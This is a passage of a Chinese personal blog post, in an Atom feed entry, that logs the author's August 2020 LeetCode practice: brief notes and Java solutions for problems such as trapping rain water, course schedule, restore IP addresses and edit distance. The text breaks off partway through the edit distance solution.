    <link href="http://yoursite.com/2020/08/01/8%E6%9C%88%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/08/01/8%E6%9C%88%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-08-01T03:45:34.000Z</published>
    <updated>2020-08-31T09:08:05.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="8月做题记录"><a href="#8月做题记录" class="headerlink" title="8月做题记录"></a>8月做题记录</h1><p>每几天就做一份md太麻烦了还得重新加标签，以后就一月一份了，反正搜也能搜到而且有目录</p><h3 id="最小区间"><a href="#最小区间" class="headerlink" title="最小区间"></a><a href="https://leetcode-cn.com/problems/smallest-range-covering-elements-from-k-lists/" target="_blank" rel="noopener">最小区间</a></h3><p>8月1日，一上来就给我整个这，昨天还误伤了本科同学给人家道歉，晚上要了暗恋的隔壁实验室小姐姐的VX结果发现和想象中的根本不是同一个人，下一周还要出差，我TM烦死</p><p>这题用堆做就是用那个优先队列，记录当前所有列表头指针指向元素中最大最小的两个，获取区间，之后将小值的列表指针后移，更新最小值和最大值，更新区间，当所有列表中有一个走完了就结束循环</p><p>用滑动窗口可太恶心了，用map映射了每一个值在哪些列表里出现过，key就是元素值，value是一个list存放所有包含这个key值的列表的索引，当窗口右指针滑到能包含所有列表索引，更新一次区间，然后左指针左移动，继续找新区间，循环是所有数字中最大最小的两个，相当于遍历所有key。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] smallestRange(List&lt;List&lt;Integer&gt;&gt; nums) &#123;        <span class="hljs-keyword">int</span> size = nums.size();        Map&lt;Integer, List&lt;Integer&gt;&gt; indices = <span class="hljs-keyword">new</span> HashMap&lt;Integer, List&lt;Integer&gt;&gt;();        <span class="hljs-keyword">int</span> xMin = Integer.MAX_VALUE, xMax = Integer.MIN_VALUE;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> x : nums.get(i)) &#123;                List&lt;Integer&gt; list = indices.getOrDefault(x, <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;());                list.add(i);                indices.put(x, list);                xMin = Math.min(xMin, x);                xMax = Math.max(xMax, x);            &#125;        &#125;        <span class="hljs-keyword">int</span>[] freq = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[size];        <span class="hljs-keyword">int</span> inside = <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> left = xMin, right = xMin - <span class="hljs-number">1</span>;        <span class="hljs-keyword">int</span> bestLeft = xMin, bestRight = xMax;        <span class="hljs-keyword">while</span> (right &lt; xMax) &#123;            right++;            <span class="hljs-keyword">if</span> (indices.containsKey(right)) &#123;                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> x : indices.get(right)) &#123;                    freq[x]++;                    <span class="hljs-keyword">if</span> (freq[x] == <span class="hljs-number">1</span>) &#123;                        inside++;                    &#125;                &#125;                <span class="hljs-keyword">while</span> (inside == size) &#123;                    <span class="hljs-keyword">if</span> (right - left &lt; bestRight - bestLeft) &#123;                        bestLeft = left;                        bestRight = right;                    &#125;                    <span class="hljs-keyword">if</span> (indices.containsKey(left)) &#123;                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> x: indices.get(left)) &#123;                            freq[x]--;                            <span class="hljs-keyword">if</span> (freq[x] == <span class="hljs-number">0</span>) &#123;                                inside--;                            &#125;                        &#125;                    &#125;                    left++;                &#125;            &#125;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;bestLeft, bestRight&#125;;    &#125;&#125;</code></pre></div><h3 id="接雨水"><a href="#接雨水" class="headerlink" title="接雨水"></a><a href="https://leetcode-cn.com/problems/trapping-rain-water/" target="_blank" rel="noopener">接雨水</a></h3><p>唉，，最近的hard都不会做。。这题用动规也可，只不过双指针更秀</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">trap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] height)</span> </span>&#123;        <span class="hljs-keyword">int</span> left=<span class="hljs-number">0</span>, right=height.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">int</span> leftmax=<span class="hljs-number">0</span>, rightmax=<span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> res=<span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(left&lt;right) &#123;            <span class="hljs-keyword">if</span>(height[left] &lt;= height[right]) &#123;                <span class="hljs-keyword">if</span>(height[left]&gt;=leftmax) leftmax=height[left];                <span class="hljs-keyword">else</span> res+=leftmax-height[left];                left++;            &#125;            <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">if</span>(height[right]&gt;=rightmax) rightmax=height[right];                <span class="hljs-keyword">else</span> res+=rightmax-height[right];                right--;            &#125;        &#125;        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="二叉树展开为链表"><a href="#二叉树展开为链表" class="headerlink" title="二叉树展开为链表"></a><a href="https://leetcode-cn.com/problems/flatten-binary-tree-to-linked-list/" target="_blank" rel="noopener">二叉树展开为链表</a></h3><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode() &#123;&#125;</span><span class="hljs-comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span><span class="hljs-comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span><span class="hljs-comment"> *         this.val = val;</span><span class="hljs-comment"> *         this.left = left;</span><span class="hljs-comment"> *         this.right = right;</span><span class="hljs-comment"> *     &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    TreeNode pre = <span class="hljs-keyword">null</span>;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">flatten</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span>;        flatten(root.right);        flatten(root.left);        root.right = pre;        root.left = <span class="hljs-keyword">null</span>;        pre = root;    &#125;&#125;</code></pre></div><h3 id="课程表"><a href="#课程表" class="headerlink" title="课程表"></a><a href="https://leetcode-cn.com/problems/course-schedule/" target="_blank" rel="noopener">课程表</a></h3><p>看K神实现的BFS拓扑排序</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">canFinish</span><span class="hljs-params">(<span class="hljs-keyword">int</span> numCourses, <span class="hljs-keyword">int</span>[][] prerequisites)</span> </span>&#123;        <span class="hljs-keyword">int</span>[] indegrees = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[numCourses];        List&lt;List&lt;Integer&gt;&gt; adj = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();        Deque&lt;Integer&gt; q = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;numCourses;i++) adj.add(<span class="hljs-keyword">new</span> ArrayList&lt;&gt;());        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span>[] cp:prerequisites) &#123;            indegrees[cp[<span class="hljs-number">0</span>]]++;            adj.get(cp[<span class="hljs-number">1</span>]).add(cp[<span class="hljs-number">0</span>]);        &#125;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;numCourses;i++)            <span class="hljs-keyword">if</span>(indegrees[i] == <span class="hljs-number">0</span>) q.add(i);        <span class="hljs-keyword">while</span>(!q.isEmpty()) &#123;            <span class="hljs-keyword">int</span> pre = q.poll();            numCourses--;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> cur:adj.get(pre))                <span class="hljs-keyword">if</span>(--indegrees[cur] == <span class="hljs-number">0</span>) q.add(cur);        &#125;        <span class="hljs-keyword">return</span> numCourses == <span class="hljs-number">0</span>;    &#125;&#125;</code></pre></div><h3 id="字符串相加"><a href="#字符串相加" class="headerlink" title="字符串相加"></a><a href="https://leetcode-cn.com/problems/add-strings/" target="_blank" rel="noopener">字符串相加</a></h3><p>每次遇到这种简单题都有点懵逼。。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">addStrings</span><span class="hljs-params">(String num1, String num2)</span> </span>&#123;        StringBuilder res = <span class="hljs-keyword">new</span> StringBuilder(<span class="hljs-string">""</span>);        <span class="hljs-keyword">int</span> i = num1.length() - <span class="hljs-number">1</span>, j = num2.length() - <span class="hljs-number">1</span>, carry = <span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(i &gt;= <span class="hljs-number">0</span> || j &gt;= <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">int</span> n1 = i &gt;= <span class="hljs-number">0</span> ? num1.charAt(i) - <span class="hljs-string">'0'</span> : <span class="hljs-number">0</span>;            <span class="hljs-keyword">int</span> n2 = j &gt;= <span class="hljs-number">0</span> ? num2.charAt(j) - <span class="hljs-string">'0'</span> : <span class="hljs-number">0</span>;            <span class="hljs-keyword">int</span> tmp = n1 + n2 + carry;            carry = tmp / <span class="hljs-number">10</span>;            res.append(tmp % <span class="hljs-number">10</span>);            i--; j--;        &#125;        <span class="hljs-keyword">if</span>(carry == <span class="hljs-number">1</span>) res.append(<span class="hljs-number">1</span>);        <span class="hljs-keyword">return</span> res.reverse().toString();    &#125;&#125;</code></pre></div><h3 id="打家劫舍-III"><a href="#打家劫舍-III" class="headerlink" title="打家劫舍 III"></a><a href="https://leetcode-cn.com/problems/house-robber-iii/" target="_blank" rel="noopener">打家劫舍 III</a></h3><p>遍历二叉树DP，每个根节点都分为偷与不偷两种情况，用哈希表存储每个节点作为根节点能偷到的最大值(维护两个哈希表分别记录偷与不偷)，可以空间优化。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode(int x) &#123; val = x; &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;        <span class="hljs-keyword">int</span>[] res = dfs(root);        <span class="hljs-keyword">return</span> Math.max(res[<span class="hljs-number">0</span>],res[<span class="hljs-number">1</span>]);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] dfs(TreeNode root) &#123;        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;        <span class="hljs-keyword">int</span>[] l = dfs(root.left);        <span class="hljs-keyword">int</span>[] r = dfs(root.right);        <span class="hljs-keyword">int</span> select = root.val + l[<span class="hljs-number">1</span>] + r[<span class="hljs-number">1</span>];        <span class="hljs-keyword">int</span> notselect = Math.max(l[<span class="hljs-number">0</span>],l[<span class="hljs-number">1</span>]) + Math.max(r[<span class="hljs-number">0</span>],r[<span class="hljs-number">1</span>]);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[] &#123;select,notselect&#125;;    &#125;&#125;</code></pre></div><h3 id="计数二进制子串"><a href="#计数二进制子串" class="headerlink" title="计数二进制子串"></a><a href="https://leetcode-cn.com/problems/count-binary-substrings/" target="_blank" rel="noopener">计数二进制子串</a></h3><p>由于0和1都必须是连续的，所以把S分成了0和1个数组成的一个数组[2,3,1,3]，相邻数字分别是0或1，所以取较小值就是他们能组成的合法的子序列的个数</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">countBinarySubstrings</span><span class="hljs-params">(String s)</span> </span>&#123;        <span class="hljs-keyword">int</span> ptr=<span class="hljs-number">0</span>,last=<span class="hljs-number">0</span>,res=<span class="hljs-number">0</span>,n=s.length();        <span class="hljs-keyword">while</span>(ptr &lt; n) &#123;            <span class="hljs-keyword">char</span> cur = s.charAt(ptr);            <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;            <span class="hljs-keyword">while</span>(ptr&lt;n &amp;&amp; s.charAt(ptr)==cur) &#123;                count++;                ptr++;            &#125;            res += Math.min(last,count);            last = count;        &#125;        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="复原IP地址"><a href="#复原IP地址" class="headerlink" title="复原IP地址"></a><a href="https://leetcode-cn.com/problems/restore-ip-addresses/" target="_blank" rel="noopener">复原IP地址</a></h3><p>一般这种要求找出符合条件的字符串并放在list里面返回的都是使用DFS</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> SEG_COUNT=<span class="hljs-number">4</span>;    List&lt;String&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();    <span class="hljs-keyword">int</span>[] segments = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[SEG_COUNT];    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">restoreIpAddresses</span><span class="hljs-params">(String s)</span> </span>&#123;        <span class="hljs-comment">// segments = new int[SEG_COUNT];</span>        dfs(s,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        <span class="hljs-keyword">return</span> res;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(String s, <span class="hljs-keyword">int</span> segID, <span class="hljs-keyword">int</span> segStart)</span> </span>&#123;        <span class="hljs-keyword">if</span>(segID == SEG_COUNT) &#123;            <span class="hljs-keyword">if</span>(segStart == s.length()) &#123;                StringBuffer ipaddr = <span class="hljs-keyword">new</span> StringBuffer();                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;SEG_COUNT;i++) &#123;                    ipaddr.append(segments[i]);                    <span class="hljs-keyword">if</span>(i!=SEG_COUNT-<span class="hljs-number">1</span>) ipaddr.append(<span class="hljs-string">'.'</span>);                &#125;                res.add(ipaddr.toString());            &#125;            <span class="hljs-keyword">return</span>;        &#125;        <span class="hljs-keyword">if</span>(segStart == s.length()) <span class="hljs-keyword">return</span>;        <span class="hljs-keyword">if</span>(s.charAt(segStart) == <span class="hljs-string">'0'</span>) &#123;            segments[segID] = <span class="hljs-number">0</span>;            dfs(s,segID+<span class="hljs-number">1</span>,segStart+<span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">int</span> addr = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> segEnd = segStart;segEnd&lt;s.length();segEnd++) &#123;            addr = addr*<span class="hljs-number">10</span> + (s.charAt(segEnd)-<span class="hljs-string">'0'</span>);            <span class="hljs-keyword">if</span>(addr&gt;<span class="hljs-number">0</span> &amp;&amp; addr&lt;=<span class="hljs-number">255</span>) &#123;                segments[segID] = addr;                dfs(s,segID+<span class="hljs-number">1</span>,segEnd+<span class="hljs-number">1</span>);            &#125;            <span class="hljs-keyword">else</span> <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;</code></pre></div><h3 id="恢复二叉搜索树"><a href="#恢复二叉搜索树" class="headerlink" title="恢复二叉搜索树"></a><a href="https://leetcode-cn.com/problems/recover-binary-search-tree/" target="_blank" rel="noopener">恢复二叉搜索树</a></h3><p>本题优化难度在于如何不使用栈空间中序遍历二叉树，使用<code>Morris中序遍历</code>，由于搜索树的中序遍历是递增序列，所以在遍历过程中找到逆序对交换节点即可</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode() &#123;&#125;</span><span class="hljs-comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span><span class="hljs-comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span><span class="hljs-comment"> *         this.val = val;</span><span class="hljs-comment"> *         this.left = left;</span><span class="hljs-comment"> *         this.right = right;</span><span class="hljs-comment"> *     &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">recoverTree</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;        TreeNode x = <span class="hljs-keyword">null</span>, y = <span class="hljs-keyword">null</span>, pred = <span class="hljs-keyword">null</span>, predecessor = <span class="hljs-keyword">null</span>;        <span class="hljs-keyword">while</span> (root != <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">if</span> (root.left != <span class="hljs-keyword">null</span>) &#123;                <span class="hljs-comment">// predecessor 节点就是当前 root 节点向左走一步，然后一直向右走至无法走为止</span>                predecessor = root.left;                <span class="hljs-keyword">while</span> (predecessor.right != <span class="hljs-keyword">null</span> &amp;&amp; predecessor.right != root) &#123;                    predecessor = predecessor.right;                &#125;                                <span class="hljs-comment">// 让 predecessor 的右指针指向 root，继续遍历左子树</span>                <span class="hljs-keyword">if</span> (predecessor.right == <span class="hljs-keyword">null</span>) &#123;                    predecessor.right = root;                    root = root.left;                &#125;                <span class="hljs-comment">// 说明左子树已经访问完了，我们需要断开链接</span>                <span class="hljs-keyword">else</span> &#123;                    <span class="hljs-keyword">if</span> (pred != <span class="hljs-keyword">null</span> &amp;&amp; root.val &lt; pred.val) &#123;                        y = root;                        <span class="hljs-keyword">if</span> (x == <span class="hljs-keyword">null</span>) &#123;                            x = pred;                        &#125;                    &#125;                    pred = root;                    predecessor.right = <span class="hljs-keyword">null</span>;                    root = root.right;                &#125;            &#125;            <span class="hljs-comment">// 如果没有左孩子，则直接访问右孩子</span>            <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">if</span> (pred != <span class="hljs-keyword">null</span> &amp;&amp; root.val &lt; pred.val) &#123;                    y = root;                    <span class="hljs-keyword">if</span> (x == <span class="hljs-keyword">null</span>) &#123;                        x = pred;                    &#125;                &#125;                pred = root;                root = root.right;            &#125;        &#125;        swap(x, y);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(TreeNode x, TreeNode y)</span> </span>&#123;        <span class="hljs-keyword">int</span> tmp = x.val;        x.val = y.val;        y.val = tmp;    &#125;&#125;</code></pre></div><h3 id="回文对"><a href="#回文对" class="headerlink" title="回文对"></a><a href="https://leetcode-cn.com/problems/palindrome-pairs/" target="_blank" rel="noopener">回文对</a></h3><p>不会做，需要使用<code>字典树 + manacher</code></p><h3 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a><a href="https://leetcode-cn.com/problems/permutations/" target="_blank" rel="noopener">全排列</a></h3><p>总算是自己做出一道DFS的组合问题了。。。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();    <span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; permute(<span class="hljs-keyword">int</span>[] nums) &#123;        dfs(nums,<span class="hljs-number">0</span>,<span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;());        <span class="hljs-keyword">return</span> res;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> start, List&lt;Integer&gt; cur)</span> </span>&#123;        <span class="hljs-keyword">if</span>(start == nums.length) &#123;            res.add(<span class="hljs-keyword">new</span> ArrayList(cur));            <span class="hljs-keyword">return</span>;        &#125;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=start;i&lt;nums.length;i++) &#123;            cur.add(nums[i]);            swap(nums,i,start);            dfs(nums,start+<span class="hljs-number">1</span>,cur);            cur.remove(cur.size()-<span class="hljs-number">1</span>);            swap(nums,i,start);        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span> </span>&#123;        <span class="hljs-keyword">int</span> tmp = nums[i];        nums[i] = nums[j];        nums[j] = tmp;    &#125;&#125;</code></pre></div><h3 id="旋转图像"><a href="#旋转图像" class="headerlink" title="旋转图像"></a><a href="https://leetcode-cn.com/problems/rotate-image/" target="_blank" rel="noopener">旋转图像</a></h3><p>可以先按角平分线翻转之后再逐行对称反转，或者是像这样按每一个外圈旋转，然后往里面缩</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;      <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rotate</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix)</span> </span>&#123;        <span class="hljs-keyword">int</span> add = <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> temp = <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> pos1 = <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> pos2 = matrix[<span class="hljs-number">0</span>].length - <span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span> (pos1 &lt; pos2)&#123;            add = <span class="hljs-number">0</span>;            <span class="hljs-keyword">while</span> (add &lt; pos2 - pos1)&#123;                temp = matrix[pos1][pos1 + add];                matrix[pos1][pos1 + add] = matrix[pos2 - add][pos1];                matrix[pos2 - add][pos1] = matrix[pos2][pos2 -add];                matrix[pos2][pos2 -add] = matrix[pos1 + add][pos2];                matrix[pos1 + add][pos2] = temp;                add++;            &#125;            pos1++;            pos2--;        &#125;    &#125;&#125;</code></pre></div><h3 id="字母异位词分组"><a href="#字母异位词分组" class="headerlink" title="字母异位词分组"></a><a href="https://leetcode-cn.com/problems/group-anagrams/" target="_blank" rel="noopener">字母异位词分组</a></h3><p>可以分到一组的单词，他们之中出现的字符的个数一定都相等，用map保存这些个数，统计26个字母出现的个数用#分割作为key，或者对字符排序后作为key，只要二者一组则字母序排序一定是一样的</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;        <span class="hljs-keyword">if</span>(strs.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList();        HashMap&lt;String,List&gt; res = <span class="hljs-keyword">new</span> HashMap();        <span class="hljs-keyword">int</span>[] count = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">26</span>];        <span class="hljs-keyword">for</span>(String s: strs) &#123;            Arrays.fill(count,<span class="hljs-number">0</span>);            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> c: s.toCharArray()) count[c-<span class="hljs-string">'a'</span>]++;            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder(<span class="hljs-string">""</span>);            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++) &#123;                sb.append(<span class="hljs-string">'#'</span>);                sb.append(count[i]);            &#125;            String key = sb.toString();            <span class="hljs-keyword">if</span>(!res.containsKey(key)) res.put(key,<span class="hljs-keyword">new</span> ArrayList());            res.get(key).add(s);        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList(res.values());    &#125;&#125;</code></pre></div><h3 id="跳跃游戏"><a href="#跳跃游戏" class="headerlink" title="跳跃游戏"></a><a href="https://leetcode-cn.com/problems/jump-game/" target="_blank" rel="noopener">跳跃游戏</a></h3><p>用max保存遍历的每一个位置所能到达的最远位置，如果能超过末尾元素说明可达</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">canJump</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = nums.length;        <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) &#123;            <span class="hljs-keyword">if</span>(i &lt;= max) &#123;                max = Math.max(max,i+nums[i]);                <span class="hljs-keyword">if</span>(max &gt;= n-<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;&#125;</code></pre></div><h3 id="合并区间"><a href="#合并区间" class="headerlink" title="合并区间"></a><a href="https://leetcode-cn.com/problems/merge-intervals/" target="_blank" rel="noopener">合并区间</a></h3><p>对tuple进行排序，java用数组排序的函数，有接口重写没太看懂，不知道用JS的话要怎么实现呢？</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[][] merge(<span class="hljs-keyword">int</span>[][] intervals) &#123;        <span class="hljs-keyword">if</span>(intervals == <span class="hljs-keyword">null</span> || intervals.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>][];        List&lt;<span class="hljs-keyword">int</span>[]&gt; merged = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();        Arrays.sort(intervals,Comparator.comparingInt(a-&gt;a[<span class="hljs-number">0</span>]));        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span>[] interval: intervals) &#123;            <span class="hljs-keyword">int</span> mergedSize = merged.size();            <span class="hljs-keyword">if</span> (merged.isEmpty()) &#123;                merged.add(interval);            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!merged.isEmpty() &amp;&amp; merged.get(mergedSize-<span class="hljs-number">1</span>)[<span class="hljs-number">1</span>] &lt; interval[<span class="hljs-number">0</span>]) &#123;                merged.add(interval);            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">int</span> lastRight = merged.get(mergedSize-<span class="hljs-number">1</span>)[<span class="hljs-number">1</span>];                merged.get(mergedSize-<span class="hljs-number">1</span>)[<span class="hljs-number">1</span>] = Math.max(lastRight, interval[<span class="hljs-number">1</span>]);            &#125;        &#125;        <span class="hljs-keyword">return</span> merged.toArray(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>][]);    &#125; &#125;</code></pre></div><h3 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a><a href="https://leetcode-cn.com/problems/edit-distance/" target="_blank" rel="noopener">编辑距离</a></h3><p>本身字符不需要改变可以直接等于<code>dp[i-1][j-1]</code>,<code>dp[i-1][j]</code>表示删除word1的最后一个字符，<code>dp[i][j-1]</code>表示在最后插入word2的最后一个字符，<code>dp[i-1][j-1]</code>表示word1的最后一个字符替换位word2的最后一个字符</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">minDistance</span><span 